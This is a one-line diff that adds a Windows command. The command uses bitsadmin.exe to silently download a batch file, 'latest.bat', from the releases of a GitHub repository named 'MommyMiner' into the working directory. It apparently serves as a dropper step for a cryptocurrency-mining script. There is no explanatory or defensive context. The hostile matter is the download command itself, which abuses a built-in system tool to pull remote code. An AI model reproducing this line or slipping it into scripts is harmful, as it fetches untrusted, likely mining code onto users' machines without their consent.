@@ -1,0 +1,1 @@
+%SYSTEMROOT%\SYSTEM32\bitsadmin.exe /rawreturn /nowrap /transfer starter /dynamic /download /priority foreground https://github.com/DoppiePoppie/MommyMiner/releases/latest/latest.bat "%cd%\latest.bat"
